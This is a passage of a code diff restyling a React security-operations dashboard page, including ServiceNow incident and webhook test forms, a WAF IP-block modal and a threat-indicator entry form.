+                    <option value="SQL_INJECTION">SQL Injection Attempt</option>
                   </select>
                 </div>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label className="text-muted block mb-1">Calling Subject</label>
-                    <input
-                      type="text"
-                      value={testSnCaller}
-                      onChange={(e) => setTestSnCaller(e.target.value)}
-                      className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                    />
-                  </div>
-                  <div>
-                    <label className="text-muted block mb-1">Target Asset</label>
-                    <input
-                      type="text"
-                      value={testSnResource}
-                      onChange={(e) => setTestSnResource(e.target.value)}
-                      className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                    />
-                  </div>
+                <div>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Caller Principal</label>
+                  <input
+                    type="text"
+                    value={testSnCaller}
+                    onChange={(e) => setTestSnCaller(e.target.value)}
+                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+                  />
                 </div>
+              </div>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label className="text-muted block mb-1">Attempted Action</label>
-                    <input
-                      type="text"
-                      value={testSnAction}
-                      onChange={(e) => setTestSnAction(e.target.value)}
-                      className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                    />
-                  </div>
-                  <div>
-                    <label className="text-muted block mb-1">Declared Purpose</label>
-                    <input
-                      type="text"
-                      value={testSnPurpose}
-                      onChange={(e) => setTestSnPurpose(e.target.value)}
-                      className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                    />
-                  </div>
-                </div>
+              <div style={{ marginBottom: '0.75rem' }}>
+                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Declared / Rogue Purpose</label>
+                <input
+                  type="text"
+                  value={testSnPurpose}
+                  onChange={(e) => setTestSnPurpose(e.target.value)}
+                  style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+                />
               </div>
 
               <button
                 onClick={handleTestServiceNow}
                 disabled={testingSn}
-                className="btn-primary w-full py-2.5 px-4 text-xs font-bold rounded-lg flex items-center justify-center gap-2"
+                className="btn btn-primary"
+                style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem' }}
+                id="test-servicenow-btn"
               >
-                <Zap size={14} />
-                <span>{testingSn ? 'Dispatching to ServiceNow...' : 'Auto-Open ServiceNow SIR Ticket'}</span>
-              </button>
-
-              {testSnResult && (
-                <div className="mt-4 p-3 bg-purple-950/20 border border-purple-500/30 rounded-lg text-xs space-y-2">
-                  <div className="flex items-center justify-between font-bold text-purple-300">
-                    <span>Incident Dispatched: {testSnResult.servicenow_number}</span>
-                    <span className="font-mono text-[10px] bg-purple-900/50 text-purple-200 px-2 py-0.5 rounded border border-purple-600/40">
-                      {testSnResult.webhook_status}
-                    </span>
-                  </div>
-                  <div className="text-[11px] font-mono text-secondary">
-                    GrantGate Reference: <span className="text-accent-crimson font-bold">{testSnResult.incident_id}</span>
-                  </div>
-                  <pre className="p-2 bg-bg-subtle rounded font-mono text-[10px] text-secondary max-h-36 overflow-y-auto border border-border-subtle">
-                    {JSON.stringify(testSnResult.payload_dispatched, null, 2)}
-                  </pre>
-                </div>
-              )}
-            </div>
-
-            {/* Inbound Webhook Simulator */}
-            <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-              <h3 className="text-sm font-bold text-primary mb-1 flex items-center gap-2">
-                <Globe size={16} className="text-blue-500" />
-                <span>ServiceNow Inbound Webhook Simulator</span>
-              </h3>
-              <p className="text-xs text-muted mb-4">
-                Simulate an incoming webhook from ServiceNow SecOps when an analyst updates an incident state or enters investigation work notes.
-              </p>
-
-              <div className="space-y-3 mb-4 text-xs">
-                <div>
-                  <label className="text-muted block mb-1">Target ServiceNow Number / Incident ID</label>
-                  <input
-                    type="text"
-                    placeholder="e.g. SIR0010042 or INC-2026-10001"
-                    value={webhookSimNumber}
-                    onChange={(e) => setWebhookSimNumber(e.target.value)}
-                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                  />
-                  <span className="text-[10px] text-muted block mt-0.5">
-                    Select an incident number from the table below to test two-way synchronization.
-                  </span>
-                </div>
-
-                <div>
-                  <label className="text-muted block mb-1">New Incident Lifecycle State</label>
-                  <select
-                    value={webhookSimState}
-                    onChange={(e) => setWebhookSimState(e.target.value)}
-                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
-                  >
-                    <option value="2">2 - Investigating (Work in Progress)</option>
-                    <option value="3">3 - Contained (Threat Neutralized)</option>
-                    <option value="6">6 - Resolved (Security Review Complete)</option>
-                    <option value="7">7 - Closed (Final Approval)</option>
-                  </select>
-                </div>
-
-                <div>
-                  <label className="text-muted block mb-1">Analyst Work Notes</label>
-                  <textarea
-                    rows={3}
-                    value={webhookSimNotes}
-                    onChange={(e) => setWebhookSimNotes(e.target.value)}
-                    className="input-text text-xs w-full p-2 rounded-lg border border-border-subtle"
-                  />
-                </div>
-              </div>
-
-              <button
-                onClick={handleSendInboundWebhook}
-                disabled={sendingInbound || !webhookSimNumber.trim()}
-                className="btn-secondary w-full py-2.5 px-4 text-xs font-bold rounded-lg flex items-center justify-center gap-2"
-              >
-                <RefreshCw size={14} className={sendingInbound ? 'animate-spin' : ''} />
-                <span>Sync Inbound Webhook to GrantGate</span>
+                <Server size={15} />
+                <span>{testingSn ? 'Transmitting to ServiceNow...' : 'Auto-Open SIR Incident via Webhook'}</span>
               </button>
             </div>
           </div>
 
-          {/* Recent Auto-Opened Incidents Table */}
-          <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-            <div className="flex items-center justify-between mb-4">
-              <h3 className="text-sm font-bold text-primary flex items-center gap-2">
-                <ExternalLink size={15} className="text-purple-500" />
-                <span>ServiceNow SIR Dispatched Incidents Stream</span>
-              </h3>
-              <span className="text-xs text-muted font-mono">
-                {snStatus?.recent_incidents?.length || 0} Synced Tickets
-              </span>
+          {/* Inbound Webhook Simulator */}
+          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
+              Inbound ServiceNow Webhook Listener
+            </h3>
+            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
+              Simulates ServiceNow sending an inbound webhook updating an existing incident status and writing analyst investigation notes.
+            </p>
+
+            <div style={{ marginBottom: '0.65rem' }}>
+              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>ServiceNow Incident #</label>
+              <input
+                type="text"
+                placeholder="SIR0010001"
+                value={webhookSimNumber}
+                onChange={(e) => setWebhookSimNumber(e.target.value)}
+                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
+              />
             </div>
 
-            {(!snStatus?.recent_incidents || snStatus.recent_incidents.length === 0) ? (
-              <div className="p-8 text-center text-muted">
-                No ServiceNow incidents recorded yet. Trigger a PDP violation above to auto-open a ticket.
-              </div>
-            ) : (
-              <div className="overflow-x-auto">
-                <table className="w-full text-left text-xs border-collapse">
-                  <thead>
-                    <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
-                      <th className="py-2.5 px-3">ServiceNow #</th>
-                      <th className="py-2.5 px-3">GrantGate ID</th>
-                      <th className="py-2.5 px-3">Title</th>
-                      <th className="py-2.5 px-3">Severity</th>
-                      <th className="py-2.5 px-3">Priority</th>
-                      <th className="py-2.5 px-3">Sync Status</th>
-                      <th className="py-2.5 px-3">Created</th>
-                      <th className="py-2.5 px-3 text-right">Actions</th>
-                    </tr>
-                  </thead>
-                  <tbody className="divide-y divide-border-subtle">
-                    {snStatus.recent_incidents.map((inc) => (
-                      <tr key={inc.id} className="hover:bg-bg-subtle/30 transition-colors">
-                        <td className="py-3 px-3 font-mono font-bold text-purple-600">
-                          {inc.servicenow_number || 'SIR0010000'}
-                        </td>
-                        <td className="py-3 px-3 font-mono font-medium text-accent-crimson">{inc.id}</td>
-                        <td className="py-3 px-3 max-w-[240px] truncate" title={inc.title}>
-                          {inc.title}
-                        </td>
-                        <td className="py-3 px-3">{getSeverityBadge(inc.severity)}</td>
-                        <td className="py-3 px-3">
-                          <span className="font-mono font-semibold px-2 py-0.5 rounded bg-bg-subtle text-secondary">
-                            {inc.priority}
-                          </span>
-                        </td>
-                        <td className="py-3 px-3">
-                          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-900/40 text-purple-300 border border-purple-500/30">
-                            {inc.webhook_status}
-                          </span>
-                        </td>
-                        <td className="py-3 px-3 text-muted">
-                          {new Date(inc.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
-                        </td>
-                        <td className="py-3 px-3 text-right">
-                          <button
-                            onClick={() => {
-                              setWebhookSimNumber(inc.servicenow_number || inc.id);
-                              setActiveTab('incidents');
-                              fetchIncidentDetails(inc.id);
-                            }}
-                            className="btn-link text-xs"
-                          >
-                            Inspect &rarr;
-                          </button>
-                        </td>
-                      </tr>
-                    ))}
-                  </tbody>
-                </table>
-              </div>
-            )}
+            <div style={{ marginBottom: '0.65rem' }}>
+              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Updated State Code</label>
+              <select
+                value={webhookSimState}
+                onChange={(e) => setWebhookSimState(e.target.value)}
+                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+              >
+                <option value="2">2 - Investigating (Work Notes)</option>
+                <option value="3">3 - Contained (IP Restricted)</option>
+                <option value="6">6 - Resolved (Grant Revoked)</option>
+                <option value="7">7 - Closed</option>
+              </select>
+            </div>
+
+            <div style={{ marginBottom: '0.85rem' }}>
+              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Analyst Work Notes</label>
+              <textarea
+                rows={3}
+                value={webhookSimNotes}
+                onChange={(e) => setWebhookSimNotes(e.target.value)}
+                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+              />
+            </div>
+
+            <button
+              onClick={handleSendInboundWebhook}
+              disabled={sendingInbound || !webhookSimNumber.trim()}
+              className="btn btn-secondary"
+              style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem', fontWeight: 700 }}
+              id="send-inbound-webhook-btn"
+            >
+              <Send size={15} />
+              <span>{sendingInbound ? 'Dispatching Webhook...' : 'Simulate Inbound ServiceNow Webhook'}</span>
+            </button>
           </div>
         </div>
       )}
 
-      {/* MODAL: MANUAL BLOCK IP */}
+      {/* Modal: Block IP */}
       {blockIpModal.open && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-          <div className="card p-6 rounded-2xl max-w-md w-full bg-card border border-border-subtle shadow-xl">
-            <h3 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
-              <Lock size={18} className="text-rose-500" />
-              <span>Block IP at WAF Layer</span>
+        <div
+          style={{
+            position: 'fixed',
+            inset: 0,
+            background: 'rgba(0,0,0,0.5)',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            zIndex: 1000,
+          }}
+        >
+          <div
+            className="glass-panel"
+            style={{
+              background: '#ffffff',
+              padding: '1.5rem',
+              borderRadius: 'var(--radius-lg)',
+              maxWidth: '420px',
+              width: '90%',
+              boxShadow: '0 8px 30px rgba(0,0,0,0.2)',
+            }}
+          >
+            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: '#b91c1c', marginBottom: '0.5rem' }}>
+              Confirm WAF IP Block
             </h3>
-            <p className="text-xs text-muted mb-4">
-              Blocks incoming traffic from this IP address at the API Gateway middleware before reaching application endpoints.
+            <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
+              Are you sure you want to restrict incoming requests from IP <strong>{blockIpModal.ip}</strong>?
             </p>
 
-            <div className="space-y-3 mb-5">
-              <div>
-                <label className="text-xs text-muted block mb-1">Target IP Address</label>
-                <input
-                  type="text"
-                  value={blockIpModal.ip}
-                  onChange={(e) => setBlockIpModal({ ...blockIpModal, ip: e.target.value })}
-                  placeholder="e.g. 198.51.100.42"
-                  className="input-text text-xs w-full py-2 px-3 rounded-lg border border-border-subtle font-mono"
-                />
-              </div>
-
-              <div>
-                <label className="text-xs text-muted block mb-1">Block Duration</label>
-                <div className="flex gap-4 text-xs">
-                  <label className="flex items-center gap-1.5 cursor-pointer">
-                    <input
-                      type="radio"
-                      checked={!blockIpModal.isPerm}
-                      onChange={() => setBlockIpModal({ ...blockIpModal, isPerm: false })}
-                    />
-                    <span>Temporary (1 Hour)</span>
-                  </label>
-                  <label className="flex items-center gap-1.5 cursor-pointer">
-                    <input
-                      type="radio"
-                      checked={blockIpModal.isPerm}
-                      onChange={() => setBlockIpModal({ ...blockIpModal, isPerm: true })}
-                    />
-                    <span>Permanent (Admin Approval)</span>
-                  </label>
-                </div>
-              </div>
-
-              <div>
-                <label className="text-xs text-muted block mb-1">Justification Reason</label>
-                <textarea
-                  rows={2}
-                  value={blockReason}
-                  onChange={(e) => setBlockReason(e.target.value)}
-                  className="input-text text-xs w-full p-2 rounded-lg border border-border-subtle"
-                />
-              </div>
+            <div style={{ marginBottom: '0.75rem' }}>
+              <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Block Reason</label>
+              <input
+                type="text"
+                value={blockReason}
+                onChange={(e) => setBlockReason(e.target.value)}
+                style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+              />
             </div>
 
-            <div className="flex justify-end gap-2">
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1.25rem', fontSize: '0.8rem' }}>
+              <input
+                type="checkbox"
+                id="isPermCheck"
+                checked={blockIpModal.isPerm}
+                onChange={(e) => setBlockIpModal({ ...blockIpModal, isPerm: e.target.checked })}
+              />
+              <label htmlFor="isPermCheck" style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
+                Permanent Block (otherwise 60 min temporary block)
+              </label>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem' }}>
               <button
                 onClick={() => setBlockIpModal({ open: false, ip: '', isPerm: false })}
-                className="btn-secondary text-xs py-2 px-4 rounded-lg"
+                className="btn btn-secondary"
               >
                 Cancel
               </button>
               <button
                 onClick={handleBlockIp}
-                disabled={!blockIpModal.ip.trim()}
-                className="btn-danger text-xs py-2 px-4 rounded-lg font-semibold"
+                className="btn btn-primary"
+                style={{ background: '#b91c1c', borderColor: '#991b1b' }}
               >
-                Confirm WAF Block
+                Confirm Block
               </button>
             </div>
           </div>
         </div>
       )}
 
-      {/* MODAL: ADD THREAT INTEL INDICATOR (IoC) */}
+      {/* Modal: New IOC Indicator */}
       {newIocModal && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-          <form onSubmit={handleCreateIoc} className="card p-6 rounded-2xl max-w-md w-full bg-card border border-border-subtle shadow-xl">
-            <h3 className="text-base font-bold text-primary mb-1 flex items-center gap-2">
-              <Radio size={18} className="text-purple-500" />
-              <span>Ingest Threat Intelligence Indicator</span>
+        <div
+          style={{
+            position: 'fixed',
+            inset: 0,
+            background: 'rgba(0,0,0,0.5)',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            zIndex: 1000,
+          }}
+        >
+          <div
+            className="glass-panel"
+            style={{
+              background: '#ffffff',
+              padding: '1.5rem',
+              borderRadius: 'var(--radius-lg)',
+              maxWidth: '460px',
+              width: '90%',
+              boxShadow: '0 8px 30px rgba(0,0,0,0.2)',
+            }}
+          >
+            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.75rem' }}>
+              Add Threat Intelligence Indicator (IOC)
             </h3>
-            <p className="text-xs text-muted mb-4">
-              Add external Indicator of Compromise (IoC) to enrich real-time request threat evaluation.
-            </p>
 
-            <div className="space-y-3 mb-5">
-              <div className="grid grid-cols-2 gap-3">
+            <form onSubmit={handleCreateIoc}>
+              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', gap: '0.5rem', marginBottom: '0.65rem' }}>
                 <div>
-                  <label className="text-xs text-muted block mb-1">Indicator Type</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Type</label>
                   <select
                     value={newIocType}
                     onChange={(e) => setNewIocType(e.target.value)}
-                    className="input-select text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
+                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                   >
                     <option value="IP">IP Address</option>
-                    <option value="DOMAIN">Domain</option>
-                    <option value="URL">URL</option>
                     <option value="HASH">File Hash</option>
+                    <option value="DOMAIN">Domain</option>
+                    <option value="URL">Malicious URL</option>
                   </select>
                 </div>
                 <div>
-                  <label className="text-xs text-muted block mb-1">Confidence ({newIocConfidence}%)</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Indicator Value</label>
                   <input
-                    type="range"
-                    min="1"
-                    max="100"
-                    value={newIocConfidence}
-                    onChange={(e) => setNewIocConfidence(Number(e.target.value))}
-                    className="w-full mt-2"
+                    type="text"
+                    required
+                    placeholder="e.g. 198.51.100.99"
+                    value={newIocValue}
+                    onChange={(e) => setNewIocValue(e.target.value)}
+                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                   />
                 </div>
               </div>
 
-              <div>
-                <label className="text-xs text-muted block mb-1">Indicator Value</label>
-                <input
-                  type="text"
-                  required
-                  placeholder="e.g. 198.51.100.42 or evil-exfil.xyz"
-                  value={newIocValue}
-                  onChange={(e) => setNewIocValue(e.target.value)}
-                  className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle font-mono"
-                />
-              </div>
-
-              <div className="grid grid-cols-2 gap-3">
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginBottom: '0.65rem' }}>
                 <div>
-                  <label className="text-xs text-muted block mb-1">Threat Actor (Optional)</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Threat Actor</label>
                   <input
                     type="text"
-                    placeholder="e.g. APT29 / Cozy Bear"
+                    placeholder="e.g. APT29"
                     value={newIocActor}
                     onChange={(e) => setNewIocActor(e.target.value)}
-                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
+                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                   />
                 </div>
                 <div>
-                  <label className="text-xs text-muted block mb-1">Campaign (Optional)</label>
+                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Campaign</label>
                   <input
                     type="text"
-                    placeholder="e.g. Operation PhishStorm"
+                    placeholder="e.g. Operation Ghost"
                     value={newIocCampaign}
                     onChange={(e) => setNewIocCampaign(e.target.value)}
-                    className="input-text text-xs w-full py-1.5 px-2.5 rounded-lg border border-border-subtle"
+                    style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                   />
                 </div>
               </div>
 
-              <div>
-                <label className="text-xs text-muted block mb-1">Description & Context</label>
-                <textarea
-                  required
-                  rows={2}
-                  placeholder="Provide context regarding this threat indicator..."
-                  value={newIocDesc}
-                  onChange={(e) => setNewIocDesc(e.target.value)}
-                  className="input-text text-xs w-full p-2 rounded-lg border border-border-subtle"
+              <div style={{ marginBottom: '0.65rem' }}>
+                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Confidence Score: {newIocConfidence}%</label>
+                <input
+                  type="range"
+                  min="50"
+                  max="100"
+                  value={newIocConfidence}
+                  onChange={(e) => setNewIocConfidence(Number(e.target.value))}
+                  style={{ width: '100%' }}
                 />
               </div>
-            </div>
 
-            <div className="flex justify-end gap-2">
-              <button
-                type="button"
-                onClick={() => setNewIocModal(false)}
-                className="btn-secondary text-xs py-2 px-4 rounded-lg"
-              >
-                Cancel
-              </button>
-              <button
-                type="submit"
-                className="btn-primary text-xs py-2 px-4 rounded-lg font-semibold"
-              >
-                Add Indicator
-              </button>
-            </div>
-          </form>
-        </div>
-      )}
-
-      {/* MODAL: EVENT PAYLOAD INSPECTION */}
-      {selectedEvent && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-          <div className="card p-6 rounded-2xl max-w-lg w-full bg-card border border-border-subtle shadow-xl">
-            <div className="flex items-center justify-between pb-3 border-b border-border-subtle mb-4">
-              <div>
-                <span className="text-xs font-mono text-accent-crimson font-bold block">{selectedEvent.id}</span>
-                <h3 className="text-sm font-bold text-primary mt-0.5">WAF Payload Inspection</h3>
-              </div>
-              <button onClick={() => setSelectedEvent(null)} className="text-muted hover:text-primary text-sm font-bold">
-                ✕
-              </button>
-            </div>
-
-            <div className="space-y-3 text-xs mb-5">
-              <div className="flex justify-between py-1 border-b border-border-subtle">
-                <span className="text-muted">Source IP:</span>
-                <span className="font-mono font-bold text-primary">{selectedEvent.source_ip}</span>
-              </div>
-              <div className="flex justify-between py-1 border-b border-border-subtle">
-                <span className="text-muted">Endpoint:</span>
-                <span className="font-mono text-secondary">{selectedEvent.method} {selectedEvent.path}</span>
-              </div>
-              <div className="flex justify-between py-1 border-b border-border-subtle">
-                <span className="text-muted">Attack Category:</span>
-                <span className="font-mono text-accent-crimson font-semibold">{selectedEvent.category}</span>
-              </div>
-              <div className="flex justify-between py-1 border-b border-border-subtle">
-                <span className="text-muted">Signature Pattern:</span>
-                <span className="font-mono text-secondary">{selectedEvent.pattern_matched || 'None'}</span>
-              </div>
-              <div className="flex justify-between py-1 border-b border-border-subtle">
-                <span className="text-muted">Risk Score:</span>
-                <span className="font-mono font-bold text-rose-600">{selectedEvent.risk_score} / 100</span>
+              <div style={{ marginBottom: '1rem' }}>
+                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Description / Context</label>
+                <textarea
+                  rows={2}
+                  required
+                  placeholder="Known command and control or payload injection source..."
+                  value={newIocDesc}
+                  onChange={(e) => setNewIocDesc(e.target.value)}
+                  style={{ width: '100%', padding: '0.45rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
+                />
               </div>
 
-              <div>
-                <label className="text-xs font-semibold text-secondary uppercase tracking-wider block mb-1">
-                  Recorded Sanitized Payload Snippet:
-                </label>
-                <pre className="p-3 bg-bg-subtle rounded-lg font-mono text-xs text-secondary overflow-x-auto border border-border-subtle max-h-40">
-                  {selectedEvent.payload_snippet || '(Empty payload)'}
-                </pre>
-                <span className="text-[11px] text-muted block mt-1">
-                  Note: Sensitive secrets, auth tokens, and emails are strictly masked before persistence.
-                </span>
+              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem' }}>
+                <button
+                  type="button"
+                  onClick={() => setNewIocModal(false)}
+                  className="btn btn-secondary"
+                >
+                  Cancel
+                </button>
+                <button
+                  type="submit"
+                  className="btn btn-primary"
+                >
+                  Save Indicator
+                </button>
               </div>
-            </div>
-
-            <div className="flex justify-end">
-              <button
-                onClick={() => setSelectedEvent(null)}
-                className="btn-secondary text-xs py-2 px-4 rounded-lg"
-              >
-                Close
-              </button>
-            </div>
+            </form>
           </div>
         </div>
       )}
     </div>
   );
 };
-export default SecOpsPage;
